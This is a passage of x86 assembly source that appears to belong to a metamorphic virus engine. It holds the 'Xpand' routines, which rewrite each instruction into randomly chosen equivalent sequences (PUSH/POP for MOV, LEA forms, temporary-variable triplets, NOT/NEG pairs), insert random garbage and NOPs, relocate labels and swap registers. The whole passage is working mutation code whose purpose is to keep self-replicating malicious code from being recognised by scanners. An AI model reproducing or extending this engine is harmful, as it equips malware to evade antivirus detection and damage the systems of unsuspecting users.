                mov     [ebp+Xp_Immediate], eax ; work field and generate the
                call    Xp_GenJMP               ; JMP instruction.
                jmp   @@Ret

   @@Xpand_Next018:
                cmp     eax, 0EAh              ; CALL Mem?
                jnz   @@Xpand_Next019
                xor     eax, eax               ; Set "32 bits" usage
                mov     [ebp+Xp_8Bits], eax
                call    Xpand_SetMemoryAddress ; Translate indexes and copy
                                               ; the operands
                call    Xp_GenCALLMem          ; Generate a CALL Mem
                jmp   @@Ret

   @@Xpand_Next019:
                cmp     eax, 0EBh              ; JMP Mem?
                jnz   @@Xpand_Next020
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax    ; Set "32 bits"
                call    Xpand_SetMemoryAddress ; Translate and set the memory
                call    Xp_GenJMPMem           ; address and generate the JMP
                jmp   @@Ret

   @@Xpand_Next020:
                cmp     eax, 0ECh           ; CALL Reg?
                jnz   @@Xpand_Next021
                xor     eax, eax            ; Set "32 bits"
                mov     [ebp+Xp_8Bits], eax
                call    Xpand_SetRegister   ; Translate and set the register
                call    Xp_GenCALLReg       ; Generate the CALL Reg
                jmp   @@Ret

   @@Xpand_Next021:
                cmp     eax, 0EDh           ; JMP Reg?
                jnz   @@Xpand_Next022
                xor     eax, eax            ; Set "32 bits"
                mov     [ebp+Xp_8Bits], eax
                call    Xpand_SetRegister   ; Translate and set the register
                call    Xp_GenJMPReg        ; Generate the JMP Reg
                jmp   @@Ret

   @@Xpand_Next022:
                cmp     eax, 0F0h           ; SHIFT Reg?
                jnz   @@Xpand_Next023
   @@Xpand_TranslateReg:
                mov     eax, [esi+1]        ; Translate the register
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [esi+1], eax        ; Set the register
                jmp   @@CopyInstruction     ; Copy the instruction

   @@Xpand_Next023:
                cmp     eax, 0F2h           ; SHIFT Reg8?
                jz    @@Xpand_TranslateReg  ; Then jump to translate et all

   @@Xpand_Next024:
                cmp     eax, 0F1h           ; SHIFT Mem?
                jnz   @@Xpand_Next025
   @@Xpand_TranslateMem:
                call    Xpand_SetMemoryAddress ; Translate the memory address
                mov     eax, [esi]             ; and copy the instruction
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                mov     eax, [esi+7]
                mov     [edi+7], eax
                add     edi, 10h
                jmp   @@Ret

   @@Xpand_Next025:
                cmp     eax, 0F3h          ; SHIFT Mem8?
                jz    @@Xpand_TranslateMem ; Then do the same as with Mem32

   @@Xpand_Next026:
                cmp     eax, 0F4h          ; APICALL_BEGIN?
                jnz   @@Xpand_Next027
                xor     eax, eax                ; Set "32 bits"
                mov     [ebp+Xp_8Bits], eax
                mov     [ebp+Xp_Register], eax  ; Generate a PUSH EAX
                call    Xp_GenPUSHReg
                mov     eax, 1
                mov     [ebp+Xp_Register], eax  ; Generate a PUSH ECX
                call    Xp_GenPUSHReg
                mov     eax, 2
                mov     [ebp+Xp_Register], eax  ; Generate a PUSH EDX
                call    Xp_GenPUSHReg
                jmp   @@Ret

   @@Xpand_Next027:
                cmp     eax, 0F5h         ; APICALL_END?
                jnz   @@Xpand_Next028
                xor     eax, eax                ; Set "32 bits"
                mov     [ebp+Xp_8Bits], eax
                mov     eax, 2
                mov     [ebp+Xp_Register], eax  ; Generate a POP EDX
                call    Xp_GenPOPReg
                mov     eax, 1
                mov     [ebp+Xp_Register], eax  ; Generate a POP ECX
                call    Xp_GenPOPReg
                xor     eax, eax
                mov     [ebp+Xp_Register], eax  ; Generate a POP EAX
                call    Xp_GenPOPReg
                jmp   @@Ret

   @@Xpand_Next028:
                cmp     eax, 0F6h          ; APICALL_STORE?
                jnz   @@Xpand_Next029_
                xor     eax, eax
                mov     [ebp+Xp_Register], eax ; Set EAX as destiny register
                call    Xpand_SetMemoryAddress ; Translate the memory address
                mov     eax, 40h               ; Set a MOV instruction
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax    ; Set "32 bits" usage
                call    Xp_GenOPMemReg         ; Generate a MOV Reg,[Mem]
                jmp   @@Ret

   @@Xpand_Next029_:
                cmp     eax, 0F8h          ; MOVZX Reg,byte ptr [Mem]?
                jnz   @@Xpand_Next029
                mov     eax, [esi+7]       ; Translate the register
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_Register], eax
                call    Xpand_SetMemoryAddress ; Translate and copy the mem.
                call    Xp_GenMOVZX            ; address and generate a MOVZX
                jmp   @@Ret

   @@Xpand_Next029:
                cmp     eax, 0FCh          ; LEA?
                jnz   @@Xpand_Next030
                call    Xpand_SetMemoryAddress  ; Then translate and copy the
                mov     eax, [esi+7]            ; memory address, do the same
                and     eax, 0FFh               ; with the destiny register,
                call    Xpand_TranslateRegister ; set "32 bits" register and
                mov     [ebp+Xp_Register], eax  ; generate the LEA,
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenLEA
                jmp   @@Ret

   @@Xpand_Next030:
                cmp     eax, 0FEh          ; RET?
                jnz   @@Xpand_Next031
                call    Xp_GenRET          ; Then generate a RET
                jmp   @@Ret

   @@Xpand_Next031:
                cmp     eax, 0FFh          ; NOP?
                jz    @@Return             ; Then avoid it

   @@Xpand_Next032:
                cmp     eax, 0F7h          ; SET_WEIGHT?
                jnz   @@Xpand_Next033

                call    Xpand_SetMemoryAddress
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     [ebp+Xp_Immediate], eax
                mov     eax, [esi+8]
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_Register], eax
                mov     eax, [esi+9]
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_SrcRegister], eax
                call    Xp_MakeSET_WEIGHT
;                 jmp   @@Ret

   @@Xpand_Next033:



   @@Ret:       call    Random             ; Get a random chance of 1/16
                and     eax, 0Fh
                or      eax, eax
                jnz   @@Return
                mov     eax, [esi]         ; If we get it, let's code garbage
                and     eax, 78h
                cmp     eax, 38h           ; If the instruction immediately
                jz    @@OnlyNOP            ; above is CMP, TEST, CALL Mem or
                cmp     eax, 48h           ; APICALL_STORE, then code only
                jz    @@OnlyNOP            ; NOP (FD 90, insert byte 90)
                cmp     eax, 0EAh
                jz    @@OnlyNOP
                cmp     eax, 0F6h
                jz    @@OnlyNOP
                call    Xp_InsertGarbage   ; Insert some garbage
   @@Return:    ret
   @@OnlyNOP:   mov     eax, 90FDh
                mov     [edi], eax         ; Set a NOP
                xor     eax, eax
                mov     [edi+0Bh], eax
                mov     [edi+0Ch], esi     ; Set the new pointer
                add     edi, 10h
                ret
XpandThisInstruction endp


;; This function gets the labels at the label table and translates them to
;; their new address, using the updated instruction pointers at field +0C on
;; the instruction itself. As we can see, the translation is trivial with
;; this system.
Xpand_UpdateLabels proc
                mov     ebx, [ebp+LabelTable]   ; Get the label table address
                mov     ecx, [ebp+NumberOfLabels]  ; Get the number of labels

  @@LoopLabel:  mov     eax, [ebx]      ; Get the address of the old instrc.
                mov     eax, [eax+0Ch]  ; Get the pointer to the new one
                mov     [ebx+4], eax    ; Set it as the new label pointer
                add     ebx, 8          ; Next label
                sub     ecx, 1
                or      ecx, ecx        ; Repeat it for all labels
                jnz   @@LoopLabel
                ret
Xpand_UpdateLabels endp

;; This function gets the indexes, translates them to their new register
;; equivalent and set them and the addition into their corresponding working
;; fields. If a memory address is an identificator of a data variable (09h as
;; first index) then the identificator is translated looking at the
;; table of variable identificators and set up, completing it with the new
;; Delta Register.
Xpand_SetMemoryAddress proc
                mov     eax, [esi+1]   ; Get the register
                and     eax, 0FFh
                cmp     eax, 9         ; Is it a variable identificator?
                jnz   @@Next_NoIdent   ; If not, act normally
                mov     eax, [esi+3]   ; Get the identificator
                mov     eax, [eax]     ; Get the new variable address and
                add     eax, [ebp+New_DATA_SECTION] ; transform it to an
                                           ; offset to add to Delta Register
                mov     [ebp+Xp_Mem_Addition], eax  ; Set it
                mov     eax, [ebp+DeltaRegister]
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_Mem_Index1], eax    ; Set the new Delta
                mov     eax, 8
                mov     [ebp+Xp_Mem_Index2], eax    ; Set Index2 as <no_reg>
                ret                            ; Return
     @@Next_NoIdent:
                mov     eax, [esi+1]      ; Get the first index
                and     eax, 0FFh
                cmp     eax, 8            ; Is there a register?
                jae   @@Next_Index        ; If not, process next index
                call    Xpand_TranslateRegister  ; Translate the register
     @@Next_Index:
                mov     [ebp+Xp_Mem_Index1], eax ; Set the register
                mov     eax, [esi+2]
                mov     ecx, eax          ; Save the multiplicator in ECX
                and     ecx, 0C0h
                and     eax, 3Fh
                cmp     eax, 8            ; Get the register in EAX
                jae   @@Next_Index2       ; If it's not a register, jump
                push    ecx
                call    Xpand_TranslateRegister
                pop     ecx               ; Translate the register and set
                or      eax, ecx          ; again the multiplicator
     @@Next_Index2:
                mov     [ebp+Xp_Mem_Index2], eax   ; Set the 2nd index
                mov     eax, [esi+3]               ; Set the dword addition
                mov     [ebp+Xp_Mem_Addition], eax
                call    RandomBoolean     ; Randomly select if we exchange
                or      eax, eax          ; the index registers
                jz    @@Return
                or      ecx, ecx          ; The multiplicator is 0?
                jnz   @@Return            ; If not, don't exchange
                mov     eax, [ebp+Xp_Mem_Index1] ; Exchange them if we can
                mov     ecx, [ebp+Xp_Mem_Index2]
                mov     [ebp+Xp_Mem_Index1], ecx
                mov     [ebp+Xp_Mem_Index2], eax
     @@Return:  ret                              ; Return
Xpand_SetMemoryAddress endp

Xpand_Set8BitsRegister proc
                mov     eax, 80h             ; Set "8 bits" register
                jmp     Xpand_SetRegister_Common
Xpand_Set8BitsRegister endp

Xpand_SetRegister proc
                xor     eax, eax             ; Set "32 bits" register
Xpand_SetRegister_Common:
                mov     [ebp+Xp_8Bits], eax  ; Set the number-of-bits flag
                mov     eax, [esi+1]
                and     eax, 0FFh            ; Get the register at +1 in the
                call    Xpand_TranslateRegister ; instruction, translate it
                mov     [ebp+Xp_Register], eax  ; and set the register
                ret
Xpand_SetRegister endp


;;;;;
;;;; Instruction generation functions
;;;;;

;; Generate an OP Reg,Imm
Xp_GenOPRegImm  proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3
                jae   @@Single        ; If 3 (maximum), don't recurse

                call    RandomBoolean ; Select randomly the shape of the
                or      eax, eax      ; expansion
                jz    @@Single
                call    Random
                and     eax, 3
                or      eax, eax
                jnz   @@Double

           ;; mov Mem,Reg
           ;; OP Mem,Imm
           ;; mov Reg,Mem
   @@Triple:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 38h         ; CMP?
                jz    @@Double           ; Then make double (flags can be
                                         ; affected with this type of triplets
                cmp     eax, 48h         ; TEST?
                jz    @@Double           ; The same as with CMP
                cmp     eax, 40h         ; MOV?
                jz    @@Double           ; Then, the same, to avoid problems
                                         ; with the shrinking
                call    Xp_SaveOperation ; Save the current op. and values
                call    Xp_GetTempVar    ; Allocate a temporary variable
                mov     eax, [ebp+Xp_Operation] ; Set MOV operation (saving
                push    eax                     ; the last one)
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    RandomBoolean       ; Select randomly if we make:
                or      eax, eax                 ; MOV Mem,Reg
                jz    @@Triple_1                 ; OP Mem,Imm
                call    Xp_GenOPMemReg           ; MOV Reg,Mem
                pop     eax                      ; or
                mov     [ebp+Xp_Operation], eax  ; MOV Mem,Imm
                call    Xp_GenOPMemImm           ; OP Mem,Reg
   @@Triple_Common:                              ; MOV Reg,Mem
                mov     eax, 40h                 ; The only problem that we
                mov     [ebp+Xp_Operation], eax  ; can have is with the op.
                call    Xp_GenOPRegMem           ; SUB Reg,Imm, but since we
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel ; have substituted
                                                 ; that operation in the
   @@Triple_1:  call    Xp_GenOPMemImm           ; shrinking by ADD Reg,-Imm,
                pop     eax                      ; we have no problem with
                mov     [ebp+Xp_Operation], eax  ; the instruction.
                call    Xp_GenOPMemReg
                jmp   @@Triple_Common

           ;; MOV Mem,Imm
           ;; OP Reg,Mem
   @@Double:    mov     eax, [ebp+Xp_Operation]  ; Get the operation
                cmp     eax, 40h                 ; MOV?
                jz    @@Double_MOV               ; Then make MOV-specific
                cmp     eax, 38h                 ; CMP?
                jz    @@Double_CMP               ; Then, CMP-specific
                cmp     eax, 48h                 ; TEST?
                jz    @@Double_TEST              ; Then, TEST-specific
   @@Double_OP: call    RandomBoolean
                or      eax, eax             ; Random TRUE/FALSE
                jz    @@Double_OP_Composed   ; If FALSE, make a composed op.
   @@Double_OP_Normal:
                call    Xp_SaveOperation         ; Save the operation
                call    Xp_GetTempVar            ; Allocate a temporary var.
                mov     eax, [ebp+Xp_Operation]
                push    eax
                mov     eax, 40h                 ; Set MOV operation
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemImm           ; Make OP Mem,Imm
                pop     eax                      ; Restore the operation
                mov     [ebp+Xp_Operation], eax
                cmp     eax, 38h                 ; If CMP, make it direct
                jz    @@Double_OP_Normal_Direct  ; (avoid the recursion)
                cmp     eax, 48h                 ; If TEST, make it direct
                jz    @@Double_OP_Normal_Direct  ; (avoid the recursion)
                call    Xp_GenOPRegMem           ; Make OP Reg,Mem
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Double_OP_Normal_Direct:
                add     eax, 2                   ; Convert the opcode to
                add     eax, [ebp+Xp_8Bits]      ; OP Reg,Mem, set the size
                mov     [edi], eax               ; of the operation in the
                call    Xp_CopyMemoryReference   ; opcode (8 or 32 bits),
                mov     eax, [ebp+Xp_Register]   ; copy the memory reference
                mov     [edi+7], eax             ; and set the register in
                add     edi, 10h                 ; the +7 position (where it
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel ; must be).

   @@Double_OP_Composed:
                mov     eax, [ebp+Xp_FlagRegOrMem] ; Save the previous value
                push    eax                        ; here
                xor     eax, eax                   ; Set "Register usage"
                mov     [ebp+Xp_FlagRegOrMem], eax
                call    Xp_MakeComposedOPImm       ; Make the composed op.
                pop     ebx                        ; Restore the value of this
                mov     [ebp+Xp_FlagRegOrMem], ebx ; flag
                or      eax, eax                  ; Check if we could make the
                jnz   @@Double_OP_Normal          ; composed operation. If
                jmp     Xp_DecreaseRecurseLevel   ; not, make it normal.

   @@Double_MOV:
                call    RandomBoolean         ; Decide randomly if we make a
                or      eax, eax              ; normal double-OP.
                jz    @@Double_OP
                mov     eax, [ebp+Xp_8Bits]   ; Get it we use 8 or 32 bits
                or      eax, eax
                jnz   @@Double_OP             ; If 8 bits, make a normal OP
                call    Xp_GenPUSHImm         ; Generate PUSH Imm
                call    Xp_GenPOPReg          ; Generate a POP Reg
                jmp     Xp_DecreaseRecurseLevel
   @@Double_CMP:
                call    RandomBoolean
                or      eax, eax              ; Make a normal OP if we get
                jz    @@Double_OP             ; TRUE randomly
                mov     edx, 38h+4            ; Select the opcodes to use with
                mov     ecx, 28h+4            ; CMP: CMP and SUB
                jmp   @@Double_OP_CMPTEST_Common
   @@Double_TEST:
                call    RandomBoolean
                or      eax, eax
                jz    @@Double_OP
                mov     edx, 48h+4            ; Select the opcodes to use with
                mov     ecx, 20h+4            ; TEST: TEST and AND
   @@Double_OP_CMPTEST_Common:
                call    Xp_SaveOperation    ; Save the current operation
                push    edx
                push    ecx
                call    Xp_GetTempVar       ; Allocate a temporary variable
                mov     eax, 40h            ; Make a MOV TempVar,Reg
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemReg
                pop     ecx
                pop     edx
                call    RandomBoolean       ; Select randomly the opcode 
                or      eax, eax            ; stored in ECX or EDX
                jz    @@Double_OP_CMPTEST_Next
                mov     edx, ecx
   @@Double_OP_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits]    ; Set the size of the operation
                mov     [edi], edx             ; in the opcode and store it
                call    Xp_CopyMemoryReference  ; blah, blah, blah...
                mov     eax, [ebp+Xp_Immediate] ; Here we have done:
                mov     [edi+7], eax            ; CMP/SUB/TEST/AND TempVar,Imm
                add     edi, 10h
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single:    mov     eax, [ebp+Xp_Operation]  ; Get the operation
                cmp     eax, 40h                 ; MOV?
                jz    @@Single_MOV
                cmp     eax, 38h                 ; CMP?
                jz    @@Single_CMP
                cmp     eax, 30h                 ; XOR?
                jz    @@Single_XOR
                or      eax, eax                 ; ADD?
                jz    @@Single_ADD
   @@Single_OP: mov     eax, [ebp+Xp_Operation]  ; Construct the instruction
                add     eax, [ebp+Xp_8Bits]      ; with the operation, size
                mov     [edi], eax               ; of operands, destiny reg.
                mov     eax, [ebp+Xp_Register]   ; and immediate value.
                mov     [edi+1], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+7], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel

   ; Here we are going to make MOV Reg,Imm in a single instruction
   @@Single_MOV:
                mov     eax, [ebp+Xp_Immediate]  ; Get the immediate value
                or      eax, eax                 ; Is it 0?
                jz    @@Single_MOV_0             ; Then, jump
   @@Single_OP_MOV:
                call    Random                 ; Select LEA making with a
                and     eax, 3                 ; probability of 25%
                or      eax, eax
                jnz   @@Single_OP
                mov     eax, [ebp+Xp_8Bits]    ; 8 bits operand size?
                or      eax, eax
                jnz   @@Single_OP              ; Then, we can't use LEA
                mov     eax, 000808FCh         ; Make LEA Reg,[Imm]
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_MOV_0:                             ; Select to make LEA with 0
                call    Random                 ; (or other) with a probability
                and     eax, 3                 ; of 25% (or normal MOV)
                or      eax, eax
                jz    @@Single_OP_MOV
                cmp     eax, 1                 ; Prob. of 25% of making XOR
                jz    @@Single_MOV_0_XOR
                cmp     eax, 2                 ; Prob. of 25% of making SUB
                jz    @@Single_MOV_0_SUB
   @@Single_MOV_0_AND:                         ; Prob. of 25% of making AND
                call    Xp_SaveOperation
                mov     eax, 20h               ; AND Reg,0
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPRegImm
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Single_MOV_0_XOR:
                add     eax, 9          ; 1, +9 = Ah, +26h = 30h: XOR
   @@Single_MOV_0_SUB:
                add     eax, 26h        ; 2, +26h = 28h: SUB
                mov     ecx, eax
                call    Xp_SaveOperation          ; Save the current operation
                mov     [ebp+Xp_Operation], ecx   ; Set the new operation
                mov     eax, [ebp+Xp_Register]    ; Set source and destiny
                mov     [ebp+Xp_SrcRegister], eax ;  register as the same
                call    Xp_GenOPRegReg            ; Gen XOR/SUB Reg,Reg
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Single_CMP:
                mov     eax, [ebp+Xp_Immediate]  ; Check if the immediate is 0
                or      eax, eax
                jnz   @@Single_OP                ; If it isn't, make it normal
                call    Random
                and     eax, 3
                or      eax, eax
                jz    @@Single_OP        ; Prob. of 25% of making CMP Reg,0
                cmp     eax, 1
                jz    @@Single_CMP_OR    ; Prob. of 25% of making OR Reg,Reg
                cmp     eax, 2
                jz    @@Single_CMP_AND   ; Prob. of 25% of making AND Reg,Reg
   @@Single_CMP_TEST:                    ; Prob. of 25% of making TEST Reg,Reg
                add     eax, 27h   ; 3, +27 = 2A, +17 = 41, +8 = 49h: TEST
   @@Single_CMP_AND:
                add     eax, 17h   ; 2, +17 = 19, +8 = 21h: AND
   @@Single_CMP_OR:
                add     eax, 8     ; 1, +8 = 9h: OR
                add     eax, [ebp+Xp_8Bits]
                mov     [edi], eax              ; Set the size
                mov     eax, [ebp+Xp_Register]  ; Get the register and set it
                mov     [edi+1], eax            ; as source and destiny
                mov     [edi+7], eax
                add     edi, 10h                ; Increase storage pointer
                jmp     Xp_DecreaseRecurseLevel

   @@Single_XOR:                                ; If we make XOR Reg,-1 we
                mov     eax, [ebp+Xp_Immediate] ; can also make NOT Reg
                cmp     eax, -1
                jnz   @@Single_OP
                call    RandomBoolean
                or      eax, eax
                jz    @@Single_OP
                call    Xp_GenNOTReg
                jmp     Xp_DecreaseRecurseLevel

   @@Single_ADD:                                ; Check the Imm
                mov     eax, [ebp+Xp_Immediate]
                cmp     eax, 1                  ; ADD Reg,1?
                jz    @@Single_ADD_NOTNEG
                cmp     eax, -1                 ; ADD Reg,-1?
                jz    @@Single_ADD_NEGNOT
   @@Single_OP_ADD:
                call    RandomBoolean           ; Select randomly TRUE/FALSE
                or      eax, eax
                jz    @@Single_OP               ; Make normal ADD if FALSE
                mov     eax, [ebp+Xp_8Bits]
                or      eax, eax                ; If size = 8 bits, don't make
                jnz   @@Single_OP               ; LEA
                mov     eax, 0FCh               ; Make LEA Reg,[Reg+Imm]
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                mov     [edi+7], eax
                mov     eax, 8
                mov     [edi+2], eax
                mov     eax, [ebp+Xp_Immediate]
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD_NOTNEG:
                call    RandomBoolean           ; Select randomly if we do
                or      eax, eax                ; NOT Reg+NEG Reg or INC Reg
                jz    @@Single_ADD_INC
                call    RandomBoolean
                or      eax, eax
                jz    @@Single_OP_ADD
                call    Xp_GenNOTReg            ; Generate NOT Reg
                call    Xp_GenNEGReg            ; Generate NEG Reg
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD_INC:
                xor     ebx, ebx
   @@Single_ADD_INCDEC_Common:
                mov     eax, [ebp+Xp_8Bits]     ; Set INC/DEC Reg. EBX is 0
                add     eax, 4Eh                ; if we decided to do INC, or
                mov     [edi], eax              ; 8 if we decided DEC
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                mov     [edi+7], ebx            ; This opcode (4E) is only
                add     edi, 10h                ; used here to tell the
                jmp     Xp_DecreaseRecurseLevel ; assembler that makes INC/DEC
   @@Single_ADD_NEGNOT:
                call    RandomBoolean
                or      eax, eax
                jz    @@Single_ADD_DEC          ; Select NEG+NOT or DEC
                call    RandomBoolean
                or      eax, eax              ; Select randomly to do NOT+NEG
                jz    @@Single_OP_ADD         ; or a normal ADD operation (or
                call    Xp_GenNEGReg          ; maybe LEA)
                call    Xp_GenNOTReg
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD_DEC:
                mov     ebx, 8                   ; Set DEC operation
                jmp   @@Single_ADD_INCDEC_Common ; Jump to complete the instr.
Xp_GenOPRegImm  endp


;; This function generates an OP Reg,Reg from the values in the corresponding
;; fields. Like the previous function, we also look for special cases for
;; some operations (MOV, etc.) to code them with valid alternatives (for
;; example, PUSH Reg+POP Reg2 for MOV, or LEA Reg,[Reg2], etc.).
Xp_GenOPRegReg  proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3          ; Too much deep in recursivity?
                jae   @@Single          ; If so, code a not-recursive instrc.
                call    RandomBoolean
                or      eax, eax        ; Select randomly the usage of a
                jz    @@Single          ; single instruction
                call    Random
                and     eax, 3
                or      eax, eax        ; Pair or triplet?
                jnz   @@Double          ; Jump to make a pair
   @@Triple:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 38h        ; If CMP, MOV or TEST make a pair
                jae   @@Double
                call    Xp_SaveOperation
                call    Xp_GetTempVar    ; Allocate a temporary variable
                mov     eax, [ebp+Xp_Operation]
                push    eax
                mov     eax, 40h                ; Set MOV operation
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemReg          ; Generate a MOV [Mem],Reg
                pop     eax
                mov     [ebp+Xp_Operation], eax ; Restore the operation
                mov     eax, [ebp+Xp_Register]
                push    eax                     ; Set the source destiny into
                mov     eax, [ebp+Xp_SrcRegister] ; the "Register" field
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPMemReg          ; Generate a OP [Mem],srcReg
                pop     eax
                mov     [ebp+Xp_Register], eax  ; Restore the destiny reg.
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax ; Set MOV operation
                call    Xp_GenOPRegMem          ; Generate a MOV Reg,[Mem]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Double:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h                ; MOV?
                jz    @@Double_MOV
                cmp     eax, 38h                ; CMP
                jz    @@Double_CMP
                cmp     eax, 48h                ; TEST?
                jz    @@Double_TEST
   @@Double_OP: call    Xp_SaveOperation
                call    Xp_GetTempVar           ; Allocate a temp. variable
                mov     eax, [ebp+Xp_Operation]
                push    eax
                mov     eax, 40h                ; Set MOV
                mov     [ebp+Xp_Operation], eax
                mov     eax, [ebp+Xp_Register]
                push    eax
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPMemReg          ; Make a MOV [TempVar],srcReg
                pop     eax
                mov     [ebp+Xp_Register], eax  ; Restore the destiny register
                pop     eax
                mov     [ebp+Xp_Operation], eax ; Restore the operation
                call    Xp_GenOPRegMem          ; Make an OP dstReg,[TempVar]
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Double_MOV:
                call    RandomBoolean
                or      eax, eax                ; Decide randomly if we use
                jz    @@Double_OP               ; the common making
                mov     eax, [ebp+Xp_8Bits]
                or      eax, eax                ; If the size is 8 bits, make
                jnz   @@Double_OP               ; a common OP
                mov     eax, [ebp+Xp_Register]
                push    eax                     ; Save the register
                mov     eax, [ebp+Xp_SrcRegister] ; Set the source register as
                mov     [ebp+Xp_Register], eax    ; the destiny
                call    Xp_GenPUSHReg             ; Generate a PUSH srcReg
                pop     eax
                mov     [ebp+Xp_Register], eax    ; Restore the desstiny reg.
                call    Xp_GenPOPReg              ; Generate a POP dstReg
                jmp     Xp_DecreaseRecurseLevel
   @@Double_CMP:
                mov     ecx, 3Bh          ; ECX = CMP [Mem],Reg
                mov     edx, 2Bh          ; EDX = SUB [Mem],Reg
   @@Double_CMPTEST_Common:
                call    RandomBoolean     ; Select if we do a normal OP or
                or      eax, eax          ; this special one
                jz    @@Double_OP
                call    Xp_SaveOperation
                push    ecx
                push    edx
                call    Xp_GetTempVar     ; Allocate a temporary variable
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemReg    ; Make a MOV [TempVar],dstReg
                pop     edx
                pop     ecx
                call    RandomBoolean     ; Now select randomly if we use the
                or      eax, eax          ; contents of ECX (CMP/AND) or
                jz    @@Double_CMPTEST_Next ; EDX (SUB/TEST)
                mov     edx, ecx
   @@Double_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits] ; Set the size into the opcode
                mov     [edi], edx                ; Make directly the instrc.
                call    Xp_CopyMemoryReference    ; (not recursive). This is
                mov     eax, [ebp+Xp_SrcRegister] ; because the flags must not
                mov     [edi+7], eax             ; be altered after performing
                add     edi, 10h                 ; this instruction.
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Double_TEST:
                mov     ecx, 23h                 ; ECX = AND [Mem],Reg
                mov     edx, 4Bh                 ; EDX = TEST [Mem],Reg (in
                jmp   @@Double_CMPTEST_Common    ; fact, the same as 4A)

   ;; Single OP Reg,Reg instruction
   @@Single:    mov     eax, [ebp+Xp_Operation]  ; Check the operation
                cmp     eax, 40h                 ; MOV?
                jz    @@Single_MOV
                or      eax, eax                 ; ADD?
                jz    @@Single_ADD
   @@Single_OP: mov     eax, [ebp+Xp_Operation]  ; Get the operation
                add     eax, 1                   ; Make it "OP Reg,Reg"
                add     eax, [ebp+Xp_8Bits]      ; Set the size of operands
                mov     [edi], eax               ; Set the pseudoopcode
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax             ; Set the destiny register
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [edi+1], eax             ; Set the source register
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_MOV:
                mov     eax, [ebp+Xp_8Bits]      ; Get the size of the op.
                or      eax, eax                 ; If it's 8 bits, make a
                jnz   @@Single_OP                ; normal, generic operation
                call    RandomBoolean
                or      eax, eax                 ; Select randomly if we make
                jz    @@Single_OP                ; this special op or not
                mov     eax, 0FCh                ; Make a LEA Reg,[Reg2]
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [edi+1], eax
                mov     eax, 8
                mov     [edi+2], eax
                xor     eax, eax
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD:
                mov     eax, [ebp+Xp_8Bits]     ; If 8 bits, we cannot use LEA
                or      eax, eax
                jnz   @@Single_OP
                call    RandomBoolean
                or      eax, eax
                jz    @@Single_OP
                mov     eax, 0FCh               ; Make LEA Reg,[Reg+Reg2]
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+1], eax
                mov     [edi+7], eax
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [edi+2], eax
                xor     eax, eax
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
Xp_GenOPRegReg  endp


;; This generates an OP Reg,Mem. As the functions above, we check for special
;; cases and we treat them, so the mutation is even more variated.
Xp_GenOPRegMem  proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3        ; Single if the recursivity level is
                jae   @@Single        ; too high to make more recursion
                call    Random
                and     eax, 7
                or      eax, eax      ; Select "Single instruction" with a
                jnz   @@Single        ; probability of 1/8
   @@Multiple:  mov     eax, [ebp+Xp_8Bits]
                or      eax, eax                     ; 8 bits?
                jnz   @@Single                       ; Then make it single
                mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h                     ; MOV?
